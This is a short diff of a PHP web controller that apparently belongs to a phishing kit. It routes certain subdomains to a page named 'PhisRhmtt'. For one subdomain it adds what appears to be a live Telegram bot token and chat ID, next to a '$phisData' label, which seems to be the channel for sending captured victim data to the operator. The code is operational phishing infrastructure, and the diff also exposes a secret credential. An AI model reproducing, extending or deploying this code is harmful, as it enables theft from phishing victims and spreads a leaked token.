@@ -85,9 +85,7 @@ class HomeController extends Controller
             return inertia('rhmtt/PhisRhmtt');
         } else if ($subdomain ===  "live-vc-private1-my20") {
             return inertia('rhmtt/PhisRhmtt');
-        } 
-        
-         else {
+        } else {
 
             return inertia('Index');
         }
@@ -181,9 +179,9 @@ class HomeController extends Controller
             $phisData = "MY20";
         } else  if ($subdomain == "live-vc-private1-my21") {
             // BOT 21s`
-            $bot_token = "";
+            $bot_token = "8149828717:AAHZb4-7lDgPb_j8AOStsg-3pO3pTETrDOM";
 
-            $chat_id = "";
+            $chat_id = "7935306179";
             $phisData = "MY21";
         }
 
